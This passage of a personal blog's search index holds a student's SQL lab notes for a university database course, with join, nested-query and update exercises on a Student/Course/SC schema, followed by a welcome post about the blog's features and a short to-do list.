SC.Sno</span><br><span class="line"># where SC.Sno=&#x27;2&#x27; and SC.Grade&gt;90;</span><br><span class="line"></span><br><span class="line"># (3)使用 IN,NOT IN,BETWEEN等谓词查询</span><br><span class="line">select Sname,Ssex</span><br><span class="line">from Student</span><br><span class="line">where Sdept in (&#x27;IS&#x27;,&#x27;MA&#x27;,&#x27;CS&#x27;);</span><br><span class="line"></span><br><span class="line">select Sname,Sdept,Sage</span><br><span class="line">from Student</span><br><span class="line">where Sage between 20 and 23;</span><br><span class="line"></span><br><span class="line"># (4)使用like子句实现模糊查询</span><br><span class="line">select Sname,Sno,Ssex</span><br><span class="line">from Student</span><br><span class="line">where Sname like &#x27;刘%&#x27;;</span><br><span class="line"></span><br><span class="line"># (5)利用order子句为结果查询</span><br><span class="line">select Sno,Grade</span><br><span class="line">from SC</span><br><span class="line">where Cno=&#x27;3&#x27;</span><br><span class="line">order by Grade DESC;</span><br><span class="line"></span><br><span class="line"># (6)用SQL Sever的统计函数进行统计计算</span><br><span class="line">select avg(Grade)</span><br><span class="line">from SC</span><br><span class="line">where Cno=&#x27;1&#x27;;</span><br><span class="line"></span><br><span class="line"># (7)用group by子句实现分组查询</span><br><span class="line">select Sno</span><br><span class="line">from SC</span><br><span class="line">group by Sno</span><br><span class="line">having count(*)&gt;3;</span><br><span class="line"></span><br><span class="line"># 4.4.2 扩展练习</span><br><span class="line"># (1)查询全体学生的学号、姓名和年龄</span><br><span class="line">select Sno,Sname,Sage from Student;</span><br><span class="line"></span><br><span class="line"># (2)查询所有计算机系学生的详细记录</span><br><span class="line">select Sno,Sname,Ssex,Sage,Scholarship from Student where Sdept=&#x27;CS&#x27;;</span><br><span class="line"></span><br><span class="line"># (3)找出考试成绩为优秀（90 分及以上）或不及格的学生的学号、课程号及成绩</span><br><span class="line">select Sno,Cno,Grade from SC where Grade&gt;=90 or Grade&lt;60;</span><br><span class="line"></span><br><span class="line"># (4)查询年龄不在 19~20 岁之间的学生姓名、性别和年龄</span><br><span class="line">select Sname,Ssex,Sage from Student where Sage&lt;19 or Sage&gt;20;</span><br><span class="line"># 方法二</span><br><span class="line">Select Sname,Ssex,Sage from Student where Sage not between 19 and 20;</span><br><span class="line"></span><br><span class="line"># (5)查询数学系(MA)、信息系(IS)的学生的姓名和所在系</span><br><span class="line">select Sname,Sdept from Student where Sdept=&#x27;MA&#x27; or Sdept=&#x27;IS&#x27;;</span><br><span class="line"></span><br><span class="line"># (6)查询名称中包含&quot;数据&quot;的所有课程的课程号、课程名及其学分</span><br><span class="line">select Cno,Cname,Ccredit from Course where Cname like &#x27;%数据%&#x27;;</span><br><span class="line"></span><br><span class="line"># (7)找出所有没有选修课成绩的学生学号和课程号 ???</span><br><span class="line">select SC.Sno,Cno</span><br><span class="line">from SC,Student</span><br><span class="line">where Student.Sno not in (select Sno from SC);</span><br><span class="line"></span><br><span class="line">select Sno</span><br><span class="line">from Student</span><br><span class="line">where Sno not in (select Sno from SC);</span><br><span class="line"></span><br><span class="line"># (8)查询学生学号为200215121的选修课的最高分、最低分以及平均成绩</span><br><span class="line">select max(Grade),min(Grade),avg(Grade)</span><br><span class="line">from SC</span><br><span class="line">where Sno=&#x27;200215121&#x27;;</span><br><span class="line"></span><br><span class="line"># (9)查询选修了2号课程的学生的学号及其成绩,查询结果按成绩升序排列</span><br><span class="line">select Sno,Grade INCR</span><br><span class="line">from SC</span><br><span class="line">where Cno=&#x27;2&#x27;;</span><br><span class="line"></span><br><span class="line"># (10)查询每个系名及其学生的平均年龄</span><br><span class="line">select Sdept,AVG(Sage)</span><br><span class="line">from Student</span><br><span class="line">group by Sdept;</span><br><span class="line"></span><br><span class="line"># 查询学生平均年龄在19岁以下(含19岁)的系别及其学生的平均年龄</span><br><span class="line">select Sdept,AVG(Sage) avgAge</span><br><span class="line">from Student</span><br><span class="line">group by Sdept</span><br><span class="line">having avgAge &lt;=19;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hust </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库系统概论实验（二）</title>
      <link href="/2024/10/06/2024-10-6-mysql2/"/>
      <url>/2024/10/06/2024-10-6-mysql2/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line"># 实验二</span><br><span class="line"># 4.2.1</span><br><span class="line"># (1) 等值连接查询与自然连接查询</span><br><span class="line">select Student.*,SC.*</span><br><span class="line">from Student,SC</span><br><span class="line">where Student.Sno=SC.Sno;</span><br><span class="line"></span><br><span class="line">select student.Sno,Sname,Ssex,Sage,Cno,Grade</span><br><span class="line">from Student,SC</span><br><span class="line">where Student.Sno=SC.Sno;</span><br><span class="line"></span><br><span class="line"># (2) 自身连接查询</span><br><span class="line">select First.Cno,Second.Cno Cpno  # 有问题</span><br><span class="line">from Course First,Course Second</span><br><span class="line">where First.Cpno=Second.Cno;</span><br><span class="line"></span><br><span class="line"># (3) 外连接查询</span><br><span class="line">select Student.Sno,Sname,Ssex,Sage,Sdept,Cno,Grade</span><br><span class="line">from Student left outer join SC on (Student.Sno = SC.Sno);</span><br><span class="line"></span><br><span class="line"># (4) 复合条件连接查询</span><br><span class="line">select Student.Sno,Student.Sname</span><br><span class="line">from Student,SC</span><br><span class="line">where Student.Sno = SC.Sno and SC.Cno=&#x27;2&#x27; and SC.Grade &gt;= 90;</span><br><span class="line"></span><br><span class="line">select Student.Sno,Sname,Cname,Grade</span><br><span class="line">from Student,SC,Course</span><br><span class="line">where Student.Sno=SC.Sno and SC.Cno=Course.Cno;</span><br><span class="line"></span><br><span class="line"># (5) 嵌套查询</span><br><span class="line">select Sno,Sname,Sdept</span><br><span class="line">from Student</span><br><span class="line">where Sdept in (select Sdept from Student where Sname = &#x27;刘晨&#x27;);</span><br><span class="line"></span><br><span class="line">select Sno,Sname,Sdept</span><br><span class="line">from Student</span><br><span class="line">where Sdept = (select Sdept from Student where Sname = &#x27;刘晨&#x27;);</span><br><span class="line"></span><br><span class="line">select S1.Sno,S1.Sname,S1.Sdept</span><br><span class="line">from Student S1,Student S2</span><br><span class="line">where S1.Sdept =S2.Sdept and S2.Sname=&#x27;刘晨&#x27;;</span><br><span class="line"></span><br><span class="line">select Sno,Sname,Sdept</span><br><span class="line">from Student S1</span><br><span class="line">where EXISTS (select * from Student S2 where S2.Sdept = S1.Sdept and S2.Sname = &#x27;刘晨&#x27;);</span><br><span class="line"></span><br><span class="line">select Sno,Student.Sname</span><br><span class="line">from Student</span><br><span class="line">where Sno in</span><br><span class="line">      (select Sno from SC where Cno in</span><br><span class="line">                          (select Cno from Course where Cname = &#x27;信息系统&#x27;));</span><br><span class="line"></span><br><span class="line">select Student.Sno,Student.Sname</span><br><span class="line">from Student,Course,SC</span><br><span class="line">where Student.Sno=SC.Sno and SC.Cno = Course.Cno and Course.Cname= &#x27;信息系统&#x27;;</span><br><span class="line"></span><br><span class="line"># (6)嵌套查询</span><br><span class="line">select Sno,Cno</span><br><span class="line">from SC x</span><br><span class="line">where Grade &gt;= (select avg(Grade)</span><br><span class="line">                from SC y</span><br><span class="line">                where y.Sno = x.Sno);</span><br><span class="line"></span><br><span class="line"># (7) 嵌套查询(all,any)</span><br><span class="line">select Sname,Student.Sage</span><br><span class="line">from Student</span><br><span class="line">where Sage &lt; any(select Sage from Student where Sdept=&#x27;CS&#x27;) and Sdept&lt;&gt;&#x27;CS&#x27;;</span><br><span class="line"></span><br><span class="line">select Sname,Student.Sage</span><br><span class="line">from Student</span><br><span class="line">where Sage &lt; (select max(Sage) from Student where Sdept=&#x27;CS&#x27;) and Sdept&lt;&gt;&#x27;CS&#x27;;</span><br><span class="line"></span><br><span class="line">select Sname,Sage</span><br><span class="line">from Student</span><br><span class="line">where Sage &lt; all(select Sage from Student where Sdept=&#x27;CS&#x27;) and Sdept&lt;&gt;&#x27;CS&#x27;;</span><br><span class="line"></span><br><span class="line">select Sname,Student.Sage</span><br><span class="line">from Student</span><br><span class="line">where Sage &lt; (select min(Sage) from Student where Sdept=&#x27;CS&#x27;) and Sdept&lt;&gt;&#x27;CS&#x27;;</span><br><span class="line"></span><br><span class="line"># (8) 嵌套查询(exists)</span><br><span class="line">select Student.Sname</span><br><span class="line">from Student</span><br><span class="line">where exists (select * from SC where Sno=Student.Sno and Cno=&#x27;1&#x27;);</span><br><span class="line"></span><br><span class="line">select Student.Sname</span><br><span class="line">from Student</span><br><span class="line">where not exists (select * from SC where Sno=Student.Sno and Cno=&#x27;1&#x27;);</span><br><span class="line"></span><br><span class="line">select Student.Sname</span><br><span class="line">from Student</span><br><span class="line">where not exists(select * from Course</span><br><span class="line">                          where not exists</span><br><span class="line">                          (select * from SC</span><br><span class="line">                                    where Sno=Student.Sno and Cno= Course.Cno));</span><br><span class="line"></span><br><span class="line"># 不懂</span><br><span class="line">select distinct Sno</span><br><span class="line">from SC SCX</span><br><span class="line">where not exists (select * from SC SCY</span><br><span class="line">                           where SCy.Sno=&#x27;200215122&#x27; and</span><br><span class="line">                                 not exists(select * from SC SCZ</span><br><span class="line">                                                     where SCZ.Sno=SCX.Sno and</span><br><span class="line">                                                           SCZ.Cno = SCY.Cno));</span><br><span class="line"></span><br><span class="line"># (9)集合查询</span><br><span class="line">select * from Student</span><br><span class="line">where Sdept=&#x27;CS&#x27;</span><br><span class="line">union</span><br><span class="line">select * from Student</span><br><span class="line">where Sage&lt;=19;</span><br><span class="line"></span><br><span class="line">select * from Student</span><br><span class="line">where Sdept=&#x27;CS&#x27; or Sage&lt;=19;</span><br><span class="line"></span><br><span class="line">select Sno from SC</span><br><span class="line">where Cno=&#x27;1&#x27;</span><br><span class="line">intersect</span><br><span class="line">select Sno from SC</span><br><span class="line">where Cno=&#x27;2&#x27;;</span><br><span class="line"></span><br><span class="line">select Sno from SC</span><br><span class="line">where Cno=&#x27;1&#x27; and Sno in (select Sno from SC where Cno=&#x27;2&#x27;);</span><br><span class="line"></span><br><span class="line"># 思考：能不能改用多重条件查询</span><br><span class="line">select Sno from SC</span><br><span class="line">where Cno=&#x27;1&#x27; and Cno=&#x27;2&#x27;;</span><br><span class="line"># 不能，因为改为多重条件查询的结果是只选修了课程一和课程二且没有选修其他课程的学生，</span><br><span class="line"># 而交集运算和嵌套查询的结果是既选修了课程一和课程二且也有可能选择了其他课程的学生</span><br><span class="line"></span><br><span class="line">select * from Student</span><br><span class="line">where Sdept=&#x27;CS&#x27;</span><br><span class="line">except</span><br><span class="line">select * from Student</span><br><span class="line">where Sage&lt;=19;</span><br><span class="line"></span><br><span class="line">select * from Student where Sdept=&#x27;CS&#x27; and Sage&gt;19;</span><br><span class="line"></span><br><span class="line"># (10)update</span><br><span class="line">update Student set Sage=Sage+1</span><br><span class="line">where Sdept=&#x27;IS&#x27;;</span><br><span class="line"></span><br><span class="line"># (11)delete</span><br><span class="line">delete from Student where Sno=&#x27;95019&#x27;;</span><br><span class="line"></span><br><span class="line"># (12)insert</span><br><span class="line">insert into SC(Sno,Cno) values(&#x27;95020&#x27;,&#x27;1&#x27;);</span><br><span class="line"># Cannot add or update a child row: a foreign key constraint fails (`s_t_u202312315`.`sc`, CONSTRAINT `sc_ibfk_1` FOREIGN KEY (`Sno`) REFERENCES `student` (`Sno`))</span><br><span class="line"># 外码 参照完整性</span><br><span class="line"></span><br><span class="line"># 4.2.2 扩展练习</span><br><span class="line"># (1)查询每门课程及其被选情况(输出所有课程中每门课的课程号、课程名称、选修该课程的学生</span><br><span class="line"># 学号及成绩--如果没有学生选择该课，则相应的学生学号及成绩为空值)</span><br><span class="line">select Course.Cno,Cname,Sno,Grade</span><br><span class="line">from Course left outer join SC on (Course.Cno=SC.Cno);</span><br><span class="line"></span><br><span class="line"># (2)查询与&quot;张立&quot;同岁的学生的学号、姓名和年龄(要求使用至少 3 种方法求解)</span><br><span class="line">select Sno,Sname,Sage</span><br><span class="line">from Student</span><br><span class="line">where Sage in (select Sage from Student where Sname = &#x27;张立&#x27;);</span><br><span class="line"></span><br><span class="line">select Sno,Sname,Sage</span><br><span class="line">from Student</span><br><span class="line">where Sage = (select Sage from Student where Sname = &#x27;张立&#x27;);</span><br><span class="line"></span><br><span class="line">select s1.Sno,s1.Sname,s1.Sage</span><br><span class="line">from Student s1,Student s2</span><br><span class="line">where s1.Sage=s2.Sage and s2.Sname=&#x27;张立&#x27;;</span><br><span class="line"></span><br><span class="line"># (3)查询选修了 3 号课程而且成绩为良好（80~89 分）的所有学生的学号和姓名</span><br><span class="line">select Student.Sno,Sname</span><br><span class="line">from Student,SC</span><br><span class="line">where Student.Sno=SC.Sno and SC.Cno=&#x27;3&#x27; and SC.Grade between 80 and 89;</span><br><span class="line"></span><br><span class="line"># (4)查询学生 200215122 选修的课程号、课程名</span><br><span class="line">select Cno,Cname</span><br><span class="line">from Course</span><br><span class="line">where Cno in (select Cno from SC</span><br><span class="line">                         where Sno=&#x27;200215122&#x27;);</span><br><span class="line"># 如何查询学生 200215122 选修的课程号、课程名及成绩</span><br><span class="line">select Course.Cno,Cname,Grade</span><br><span class="line">from Course,SC</span><br><span class="line">where SC.Cno=Course.Cno and SC.Sno=&#x27;200215122&#x27;;</span><br><span class="line"></span><br><span class="line"># (5)找出每个学生低于他所选修课程平均成绩5分以上的课程号(输出学号和课程号)</span><br><span class="line">select Sno,Cno</span><br><span class="line">from SC x</span><br><span class="line">where Grade &lt; (select Avg(Grade)-5 from SC y where x.Sno=y.Sno)</span><br><span class="line"></span><br><span class="line"># (6)查询比所有男生年龄都小的女生的学号、姓名和年龄</span><br><span class="line">select Sno,Sname,Sage</span><br><span class="line">from Student</span><br><span class="line">where Ssex=&#x27;女&#x27; and Sage&lt;all(select Sage from Student where Ssex=&#x27;男&#x27;);</span><br><span class="line"></span><br><span class="line">select Sno,Sname,Sage</span><br><span class="line">from Student</span><br><span class="line">where Sage &lt; (select min(Sage) from Student where Ssex=&#x27;男&#x27;) and Ssex=&#x27;女&#x27;;</span><br><span class="line"></span><br><span class="line"># (7)查询所有选修了2号课程的学生姓名及所在系</span><br><span class="line">select Sname,Sdept</span><br><span class="line">from Student,SC</span><br><span class="line">where Student.Sno=SC.Sno and Cno=&#x27;2&#x27;;</span><br><span class="line"></span><br><span class="line"># (8)使用update语句把成绩为良(80~89分)的学生的年龄增加2岁，并查询出来  ???</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># (9)使用insert语句增加两门课程:C语言和人工智能,并查询出来</span><br><span class="line">insert into Course(Cno,Cname,Cpno,Ccredit) values (&#x27;8&#x27;,&#x27;C语言&#x27;,NULL,&#x27;2&#x27;);</span><br><span class="line">insert into Course(Cno,Cname,Cpno,Ccredit) values (&#x27;9&#x27;,&#x27;人工智能&#x27;,NULL,&#x27;3&#x27;);</span><br><span class="line"></span><br><span class="line">select *</span><br><span class="line">from Course</span><br><span class="line">where Cname in (&#x27;C语言&#x27;,&#x27;人工智能&#x27;);</span><br><span class="line"></span><br><span class="line"># (10)使用 delete 语句把人工智能课程删除，并查询出来</span><br><span class="line">delete from Course</span><br><span class="line">where Cname in (&#x27;C语言&#x27;,&#x27;人工智能&#x27;);</span><br><span class="line"></span><br><span class="line">select *</span><br><span class="line">from Course;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hust </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello Blog</title>
      <link href="/2024/10/01/2024-10-3-firstpage/"/>
      <url>/2024/10/01/2024-10-3-firstpage/</url>
      
        <content type="html"><![CDATA[<h2 id="Welcome-to-my-blog"><a href="#Welcome-to-my-blog" class="headerlink" title="Welcome to my blog"></a><em><strong>Welcome to my blog</strong></em></h2><blockquote><p><strong>This is the first blog, as well as the first step.</strong><br>记录学习，记录生活</p></blockquote><hr><h3 id="Special-function"><a href="#Special-function" class="headerlink" title="Special function"></a>Special function</h3><ul><li>主页菜单栏<br>增加<strong>首页</strong>、<strong>归档</strong>、<strong>标签</strong>、<strong>分类</strong>、<strong>列表</strong>、<strong>留言板</strong>、<strong>友链</strong>、<strong>关于</strong><br><strong>个性化icon&#x2F;图标</strong><br><strong>文章搜索</strong>功能<br><img src="/img/intro/1.png"></li><li>主页页面<br><strong>动态</strong>标语，<strong>美文</strong>一则<br>每次刷新页面自动更新美文<br><img src="/img/intro/2.png"></li><li>可爱玩偶<br>左下角的小玩偶会<strong>跟随鼠标移动</strong><br><strong>小白</strong>和<strong>小女孩</strong>形象随机不定时切换<br> <img src="/img/intro/3.png"><br> <img src="/img/intro/4.png"></li><li>day &amp; night<br>右下角设置栏切换白天和黑夜<br>夜间模式下自动启动霓虹灯，标题会<strong>sparkling</strong>🌟🌟🌟<br>夜间模式背景出现<strong>流星雨</strong>🌠🌠🌠</li><li>计时器<br>新增<strong>建站计时器</strong>，页脚新增<strong>个性化Logo</strong><br><img src="/img/intro/5.png"></li><li>个人简介栏<br><strong>个性签名</strong><br><strong>渐变</strong>背景颜色，黑夜模式自适背景<br>联系方式新增<strong>github</strong>,<strong>e-mail</strong>,<strong>wechat</strong>,<strong>qq</strong>,<strong>bilibili</strong></li><li>侧滑栏<br>新增📢<strong>公告栏</strong> 🗂️<strong>分类</strong> 🔖<strong>标签</strong>、✉️<strong>小站资讯</strong></li><li>一图流<br>背景<strong>一图流</strong>，<strong>页面美化</strong></li><li>鼠标点击效果<br>点击鼠标可以<strong>触发爱心</strong>❤️<br>鼠标停留会<strong>聚集彩色飘带</strong>，点击会<strong>释放飘带</strong>🎗️</li><li>协议<br>新增<strong>转载协议</strong><br><strong>渐变色</strong>背景框<br><img src="/img/intro/6.png"></li><li>投喂作者<br>娱乐功能🥰🥰🥰（如果你愿意也可以试试投喂功能🚀耶）<br><img src="/img/intro/7.png"></li><li>音乐🎶电影🎞️<br>功能仍在开发中🚲</li><li>友链<br>欢迎联系我，欢迎<strong>互换友链</strong>💕</li></ul><p>更多有趣的功能等待你来探索哟🚀</p>]]></content>
      
      
      <categories>
          
          <category> life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>国庆</title>
      <link href="/2024/09/30/2024-10-3-list/"/>
      <url>/2024/09/30/2024-10-3-list/</url>
      
        <content type="html"><![CDATA[<ul><li><input disabled="" type="checkbox"> Blog</li><li><input disabled="" type="checkbox"> CTF</li><li><input disabled="" type="checkbox"> 数据库实验</li><li><input disabled="" type="checkbox"> tftp套接字</li><li><input disabled="" type="checkbox"> 项目</li><li><input disabled="" type="checkbox"> 冬令营</li></ul>]]></content>
      
      
      <categories>
          
          <category> study </category>
          
      </categories>
      
      
        <tags>
            
            <tag> list </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
